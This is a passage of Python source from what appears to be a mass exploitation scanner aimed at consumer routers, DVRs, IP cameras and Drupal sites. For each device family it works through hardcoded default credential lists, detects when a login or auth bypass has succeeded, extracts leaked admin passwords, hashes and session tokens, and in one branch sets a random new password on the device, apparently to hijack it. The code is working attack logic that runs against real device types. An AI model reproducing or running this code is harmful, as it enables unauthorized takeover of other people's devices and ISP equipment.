					webtask_customdata2[jobhash] = 'YWRtaW4='
					webtask_customdata3[jobhash] = ''
					webtask_payloadindex[jobhash] = 0
			else:
				webtask_payloadindex[jobhash] = 99
		# check for updated WWW_SID
		matches = re.search( 'sessionID=([a-zA-Z0-9]+)', webclient_response[webhash] )
		if matches:
			webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'zxdsl831':
		if webtask_payloadindex[jobhash] <= 1:
			if 'vpivci.cgi' in webclient_response[webhash]:
				webtask_login[jobhash] = 'n'
				webtask_password[jobhash] = 'a'
				webtask_payloadindex[jobhash] = 1
			else:
				if webtask_payloadindex[jobhash] >= 1:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'engenius':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'crossweb':
		# Cross Web Server, white label DVRs and cams
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'hanbang':
		if webtask_payloadindex[jobhash] > 0 and webtask_payloadindex[jobhash] <= 5:
			# if response is anything but 200 OK we have the wrong pw
			if 'Value>200</status' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '888888'
					webtask_customdata1[jobhash] = 'YWRtaW46ODg4ODg4'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata1[jobhash] = 'YWRtaW46YWRtaW4='
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '123456'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU2'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 4:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '000000'
					webtask_customdata1[jobhash] = 'YWRtaW46MDAwMDAw'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 5:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '12345678'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU2Nzg='
					webtask_payloadindex[jobhash] = 5
			else:
				if webtask_payloadindex[jobhash] >= 5:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'hiwebalr':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'dasanpon':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'twistedweb':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'lilin3520':
		if webtask_payloadindex[jobhash] >= 0 and webtask_payloadindex[jobhash] <= 2:
			# look for 200 OK
			if 'HTTP/1.0 200 OK' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'root'
					webtask_password[jobhash] = 'icatch99'
					webtask_customdata1[jobhash] = 'cm9vdDppY2F0Y2g5OQ=='
					webtask_payloadindex[jobhash] = 2
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '123456'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU2'
					webtask_payloadindex[jobhash] = 2
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'report'
					webtask_password[jobhash] = '8Jg0SR8K50'
					webtask_customdata1[jobhash] = 'cmVwb3J0OjhKZzBTUjhLNTA='
					webtask_payloadindex[jobhash] = 2
			else:    
				if webtask_payloadindex[jobhash] >= 2:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'tbkdvr':
		if webtask_payloadindex[jobhash] == 0:
			# first just look for an admin account
			matches = re.search( 'uid":"admin","pwd":"([^"]*)"', webclient_response[webhash] )
			if matches:
				webtask_login[jobhash] = 'admin'
				webtask_password[jobhash] = matches.group(1)
			else:
				# look for max role account
				for role in range(1,4):
					matches = re.search( 'uid":"([^"]+)","pwd":"([^"]*)".*role":(\d+)', webclient_response[webhash] )
					if matches:
						webtask_login[jobhash] = matches.group(1)
						webtask_password[jobhash] = matches.group(2)
						break
					else:
						webtask_payloadindex[jobhash] = 99
		if webtask_payloadindex[jobhash] == 1:
			# now grab session
			matches = re.search( 'Set-Cookie:session=([A-Za-z0-9]*);', webclient_response[webhash] )
			if matches:
				webtask_customdata1[jobhash] = matches.group(1)
			else:
				webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'tplink849':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'vigorweb':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'intelbras1200':
		if webtask_payloadindex[jobhash] == 0:
			# at the initial call we hopefully should get our session cookie
			matches = re.search( 'Set-Cookie: (password=\S+); path', webclient_response[webhash] )
			if matches:
				webtask_login[jobhash] = 'admin'
				webtask_customdata1[jobhash] = matches.group(1)
			else:
				webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'comtrenddlink':
		if webtask_payloadindex[jobhash] >= 0 and webtask_payloadindex[jobhash] <= 12:
			# look for 200 OK
			# if response is anything but 200 OK we have the wrong pw
			if 'HTTP/1.1 200 O' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'root'
					webtask_password[jobhash] = '12345'
					webtask_customdata2[jobhash] = 'cm9vdDoxMjM0NQ=='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'user'
					webtask_password[jobhash] = 'user'
					webtask_customdata2[jobhash] = 'dXNlcjp1c2Vy'
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'support'
					webtask_password[jobhash] = 'support'
					webtask_customdata2[jobhash] = 'c3VwcG9ydDpzdXBwb3J0'
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_customdata2[jobhash] = 'YWRtaW46MTIzNA=='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 4:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata2[jobhash] = 'YWRtaW46YWRtaW4='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 5:
					webtask_login[jobhash] = 'CUAdmin'
					webtask_password[jobhash] = 'CUAdmin'
					webtask_customdata2[jobhash] = 'Q1VBZG1pbjpDVUFkbWlu'
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 6:
					webtask_login[jobhash] = 'telnetadmin'
					webtask_password[jobhash] = 'telnetadmin'
					webtask_customdata2[jobhash] = 'dGVsbmV0YWRtaW46dGVsbmV0YWRtaW4='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 7:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'password'
					webtask_customdata2[jobhash] = 'YWRtaW46cGFzc3dvcmQ='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 8:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'TrustPower'
					webtask_customdata2[jobhash] = 'YWRtaW46VHJ1c3RQb3dlcg=='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 9:
					webtask_login[jobhash] = 'e8ehome'
					webtask_password[jobhash] = 'e8ehome'
					webtask_customdata2[jobhash] = 'ZThlaG9tZTplOGVob21l'
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 10:
					webtask_login[jobhash] = 'supervisor'
					webtask_password[jobhash] = 'zyad1234'
					webtask_customdata2[jobhash] = 'c3VwZXJ2aXNvcjp6eWFkMTIzNA=='
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 11:
					webtask_login[jobhash] = 'telecomadmin'
					webtask_password[jobhash] = 'nE7jA%5m'
					webtask_customdata2[jobhash] = 'dGVsZWNvbWFkbWluL25FN2pBJTVt'
					webtask_payloadindex[jobhash] = 12
				elif webtask_payloadindex[jobhash] == 12:
					webtask_login[jobhash] = '<none>'			# for this payload the login/password are only for backend reference
					webtask_password[jobhash] = '<none>'   # so we'll make a successful empty login stand out from a failed result
					webtask_customdata2[jobhash] = 'Og=='
					webtask_payloadindex[jobhash] = 12
			else:    
 				if webtask_payloadindex[jobhash] >= 12:
					webtask_payloadindex[jobhash] = 99
		else:
			if 'sessionKey' in webclient_response[webhash]:
				matches = re.search( 'sessionKey=\'?(\d+)', webclient_response[webhash] )
				if matches:
					webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'vsol':
		if webtask_payloadindex[jobhash] >= 0 and webtask_payloadindex[jobhash] <= 2:
			# look for relocation
			if 'Location: /\r' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'stdONU101'
					webtask_payloadindex[jobhash] = 2
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin' 
					webtask_payloadindex[jobhash] = 2
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'user'
					webtask_password[jobhash] = 'user' 
					webtask_payloadindex[jobhash] = 2
			else:
				if webtask_payloadindex[jobhash] >= 2:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'drupal8':
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'drupal7':
		matches = re.search( 'hidden\S\sname=\Sform_build_id\S\svalue="(\S+)"\s\/>', webclient_response[webhash] )
		if matches:
			webtask_customdata1[jobhash] = matches.group(1)
		else:
			# if we don't get a form value for our first query just bail out altogether
			if webtask_payloadindex[jobhash] == 0:
				webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'grandstream':
		if webtask_payloadindex[jobhash] <= 4:
			# if response is anything but 200 OK we have the wrong pw
			if '200 OK' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata1[jobhash] = 'YWRtaW46YWRtaW4='
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '12345'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU='
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNA=='
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '123456'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU2'
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 4:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '888888'
					webtask_customdata1[jobhash] = 'YWRtaW46ODg4ODg4'
					webtask_payloadindex[jobhash] = 4
			else:
				if webtask_payloadindex[jobhash] >= 4:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'dir300600':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'dir850':
		if webtask_payloadindex[jobhash] == 0:
			if '<gw_name>' in webclient_response[webhash]:
				matches1 = re.search( 'name>([^<]+)</name', webclient_response[webhash] )
				matches2 = re.search( 'password>(.*)</password>', webclient_response[webhash] )
				if matches1 and matches2:
					webtask_login[jobhash] = matches1.group(1)
					webtask_password[jobhash] = matches2.group(1)
		if webtask_payloadindex[jobhash] == 1:
			# ugly hack - if this is captchaless we add a token to the username
			if 'status": "ok"' in webclient_response[webhash]:
				webtask_login[jobhash] += 'OK'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'hikweb':
		if webtask_payloadindex[jobhash] <= 10:
			# if we get a Reboot Required our auth bypass attempt worked
			if 'Reboot Required' in webclient_response[webhash]:
				webtask_login[jobhash] = 'n'
				webtask_password[jobhash] = 'a'
			# if response is anything but 200 OK we have the wrong pw
			elif 'Value>200</status' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '12345'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU='
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata1[jobhash] = 'YWRtaW46YWRtaW4='
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNA=='
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '888888'
					webtask_customdata1[jobhash] = 'YWRtaW46ODg4ODg4'
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 4:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '54321'
					webtask_customdata1[jobhash] = 'YWRtaW46NTQzMjE='
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 5:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '123456'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU2'
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 6:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '111111'
					webtask_customdata1[jobhash] = 'YWRtaW46MTExMTEx'
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 7:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '654321'
					webtask_customdata1[jobhash] = 'YWRtaW46NjU0MzIx'
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 8:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '123456789abc'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNDU2Nzg5YWJj'
					webtask_payloadindex[jobhash] = 10
				elif webtask_payloadindex[jobhash] == 9:
					# bashis/montecrypt exploit
					pass
				elif webtask_payloadindex[jobhash] == 10:
					# reboot auth bypass just in case unit needs it
					pass
			else:
				if webtask_payloadindex[jobhash] >= 10:
					webtask_payloadindex[jobhash] = 99
		if webtask_login[jobhash] == 'n':
			# auth bypass worked, slow down connection reqs for us to be able to register success
			webtask_nextconnectiontime[jobhash] = time.time() + 60
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'sify':
		if webtask_payloadindex[jobhash] <= 0:
			# if response is anything but a Cookie and a Location then assume failure
			matches1 = re.search( 'Location: /cgi-bin/luci/;stok=([a-f0-9]+)', webclient_response[webhash] )
			matches2 = re.search( 'Set-Cookie: sysauth=([a-f0-9]+);', webclient_response[webhash] )
			if matches1 and matches2:
				webtask_customdata1[jobhash] = matches1.group(1)
				webtask_customdata2[jobhash] = matches2.group(1)
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 0
			else:
				if webtask_payloadindex[jobhash] >= 0:
					webtask_payloadindex[jobhash] = 99
		else:
			pass
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'zyxelp660':
		if webtask_payloadindex[jobhash] <= 1:
			# can 300 to a few URLs on success so just check for failed login URL
      # can result in FPs on slightly different APIs, verify in wild
			if not '/rpAuth' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_payloadindex[jobhash] = 1
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 1
			else:
				if webtask_payloadindex[jobhash] >= 1:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'supernet':
		# Supernet Infocomm India, mainly used by BSNL ?
		if webtask_payloadindex[jobhash] <= 0:
			if '200 OK' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 0
			else:
				if webtask_payloadindex[jobhash] >= 0:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'realtron':
		# Realtron India BSNL, VNPT, etc
		if webtask_payloadindex[jobhash] <= 3:
			if '200 OK' in webclient_response[webhash] and not 'Failed' in webclient_response[webhash] and not 'enter a username and password when prompted' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata1[jobhash] = 'YWRtaW46YWRtaW4='
					webtask_payloadindex[jobhash] = 3
				if webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_customdata1[jobhash] = 'YWRtaW46YWRtaW4='
					webtask_payloadindex[jobhash] = 3
				if webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_customdata1[jobhash] = 'YWRtaW46MTIzNA=='
					webtask_payloadindex[jobhash] = 3
				if webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'password'
					webtask_customdata1[jobhash] = 'YWRtaW46cGFzc3dvcmQ='
					webtask_payloadindex[jobhash] = 3
			else:
				if webtask_payloadindex[jobhash] >= 3:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'pldtmydsl':
		if webtask_payloadindex[jobhash] <= 0:
			# if response is anything but a SESSION key login failed
			matches = re.search( 'SESSION=(\d+)', webclient_response[webhash] )
			if matches:
				webtask_customdata1[jobhash] = matches.group(1)
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_payloadindex[jobhash] = 0
			else:
				if webtask_payloadindex[jobhash] >= 0:
					webtask_payloadindex[jobhash] = 99
		else:
			# update session if needed
			matches = re.search( 'SESSION=(\d+)', webclient_response[webhash] )
			if matches:
				webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'pldtfibr':
		if webtask_payloadindex[jobhash] <= 3:
			# if response is anything but 200 OK we have the wrong pw
			if '/menu_pldt.asp' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'adminpldt'
					webtask_password[jobhash] = '0123456789'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'adminpldt'
					webtask_password[jobhash] = '1234567890'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = '1234'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 3
			else:
				if webtask_payloadindex[jobhash] >= 3:
					webtask_payloadindex[jobhash] = 99
		if webtask_payloadindex[jobhash] == 4:
			webtask_newpassword[jobhash] = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678901234567890123456789') for i in range(8))
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'foscamold':
		if webtask_payloadindex[jobhash] == 0:
			# if response is anything but 200 OK we have the wrong pw
			if 'HTTP/1.1 200 O' in webclient_response[webhash]:
				webtask_login[jobhash] = 'admin'
				webtask_password[jobhash] = ''
			else:
				webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'telkomdlink':
		if webtask_payloadindex[jobhash] == 0:
			# if response is anything but 200 OK we have the wrong pw
			if 'HTTP/1.1 200 O' in webclient_response[webhash]:
				webtask_login[jobhash] = 'support'
				webtask_password[jobhash] = 'TelkomDlink12345'
			else:
				webtask_payloadindex[jobhash] = 99
		else:
			if 'sessionKey' in webclient_response[webhash]:
				matches = re.search( 'sessionKey=\'?(\d+)', webclient_response[webhash] )
				if matches:
					webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'aztechweb':
		if webtask_payloadindex[jobhash] <= 4:
			# if response is anything but a SESSIONID cookie assume failure
			matches = re.search( 'SESSIONID=(\d+)', webclient_response[webhash] )
			if matches:
				webtask_customdata1[jobhash] = matches.group(1)
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'bayandsl'
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'epicrouter'
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'password'
					webtask_payloadindex[jobhash] = 4
				elif webtask_payloadindex[jobhash] == 4:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = ''
					webtask_payloadindex[jobhash] = 4
			else:
				if webtask_payloadindex[jobhash] >= 4:
					webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'netgeardgn1022':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'netgearr7064':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'vacron':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'jaws':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'readynas':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'airosfile':
		webtask_login[jobhash] = 'n'
		webtask_password[jobhash] = 'a'
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'xionghash':
		# xiongmai information leak, try to extract admin hash (same format as dahua 48 bit)
		# will be processed by other protocols..
		testreg = re.sub( "[\r\n]", '', webclient_response[webhash] )
		matches = re.search( 'Name"\s+:\s+"admin",.*?"Password"\s+:\s+"([A-Za-z0-9]{8})"', testreg )
		if matches:
			webtask_login[jobhash] = 'admin'
			webtask_password[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'mediatekajax':
		# MediaTek devices with the ajax.cgi API
		if webtask_payloadindex[jobhash] <= 5:
			if '?sid=' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin123'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin1234'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'password'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 4:
					webtask_login[jobhash] = 'user'
					webtask_password[jobhash] = 'user'
					webtask_payloadindex[jobhash] = 5
				elif webtask_payloadindex[jobhash] == 5:
					webtask_login[jobhash] = 'guest'
					webtask_password[jobhash] = 'guest'
					webtask_payloadindex[jobhash] = 5
			else:
				if webtask_payloadindex[jobhash] >= 5:
					webtask_payloadindex[jobhash] = 99
		# check for updated sid
		matches = re.search( '\?sid=([a-zA-Z0-9]+)', webclient_response[webhash] )
		if matches:
			webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1
			
	if actionscript == 'mediatekwimax':
		# BSNL Pointmax mtguest/mtguest devices etc MediaTek Wimaxes
		if webtask_payloadindex[jobhash] <= 3:
			# if response is anything but 200 OK we have the wrong pw
			if '?WWW_SID=SID' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'user'
					webtask_password[jobhash] = 'user'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'guest'
					webtask_password[jobhash] = 'guest'
					webtask_payloadindex[jobhash] = 3
				elif webtask_payloadindex[jobhash] == 3:
					webtask_login[jobhash] = 'guest'
					webtask_password[jobhash] = 'linkem123'
					webtask_payloadindex[jobhash] = 3
			else:
				if webtask_payloadindex[jobhash] >= 3:
					webtask_payloadindex[jobhash] = 99
		# check for updated WWW_SID
		matches = re.search( '\?WWW_SID=(SID\d+)', webclient_response[webhash] )
		if matches:
			webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'mediatekrpc':
		# MediaTek with rpc.cgi
		if webtask_payloadindex[jobhash] <= 2:
			if '?WWW_SID=' in webclient_response[webhash]:
				if webtask_payloadindex[jobhash] == 0:
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
					webtask_payloadindex[jobhash] = 2
				elif webtask_payloadindex[jobhash] == 1:
					webtask_login[jobhash] = 'user'
					webtask_password[jobhash] = 'user'
					webtask_payloadindex[jobhash] = 2
				elif webtask_payloadindex[jobhash] == 2:
					webtask_login[jobhash] = 'guest'
					webtask_password[jobhash] = 'guest'
					webtask_payloadindex[jobhash] = 2
			else:
				if webtask_payloadindex[jobhash] >= 2:
					webtask_payloadindex[jobhash] = 99
		# check for updated WWW_SID
		matches = re.search( '\?WWW_SID=([A-Z0-9]+)', webclient_response[webhash] )
		if matches:
			webtask_customdata1[jobhash] = matches.group(1)
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'mdmweb':
		# Qualcomm MDM 
		if webtask_payloadindex[jobhash] == 0:
			# here we need to extract the token if login succeeded..
			matches = re.search( '"result":"0".*"token":"([^"]+)"', webclient_response[webhash] );
			if matches:
				webtask_customdata1[jobhash] = matches.group(1)
				webtask_login[jobhash] = 'admin'
				webtask_password[jobhash] = 'admin'
				webtask_payloadindex[jobhash] = 1
		elif webtask_payloadindex[jobhash] == 1:
			# here we need to extract the token if login succeeded..
			matches = re.search( '"result":"0".*"token":"([^"]+)"', webclient_response[webhash] );
			if matches:
				webtask_customdata1[jobhash] = matches.group(1)
				webtask_login[jobhash] = 'admin'
				webtask_password[jobhash] = 'admin'
			else:
				webtask_payloadindex[jobhash] = 99
		webtask_payloadindex[jobhash] += 1
		
	if actionscript == 'huntcctv':
		# Hunt CCTV
		if webtask_payloadindex[jobhash] == 0:
			if 'USER1_USERNAME=' in webclient_response[webhash]:
				matches1 = re.search( 'USER1_USERNAME=(\S+)', webclient_response[webhash] )
				matches2 = re.search( 'USER1_PASSWORD=(\S+)', webclient_response[webhash] )
				if matches1 and matches2:
					webtask_login[jobhash] = matches1.group(1)
					webtask_password[jobhash] = matches2.group(1)
					webtask_customdata1[jobhash] = binascii.b2a_base64('%s:%s'%(webtask_login[jobhash],webtask_password[jobhash])).strip()
			else:
				webtask_customdata1[jobhash] = 'YWRtaW46YWRtaW4='  # try admin:admin in case we could not get login creds
		if webtask_payloadindex[jobhash] == 1:
			if not '200 O' in webclient_response[webhash]:
				webtask_payloadindex[jobhash] = 99
			else:
				if webtask_login[jobhash] == '' and webtask_password[jobhash] == '':
					webtask_login[jobhash] = 'admin'
					webtask_password[jobhash] = 'admin'
		webtask_payloadindex[jobhash] += 1

	if actionscript == 'dahua':
		# Dahua passwd leak and login bypass Gen 2 and 3
		if webtask_payloadindex[jobhash] == 0:
			# here we need to extract the login/hashes
			pwconfig = webclient_response[webhash].split('\n')
			pwdb = []
			for line in pwconfig:
				matches = re.search( '^\d:([^:]+):([^:]+):\d+\S+,\s+\S+,', line )
				if matches:
					pwdb.append( matches.group(1) + "/" + matches.group(2) )
			if len(pwdb) > 0:
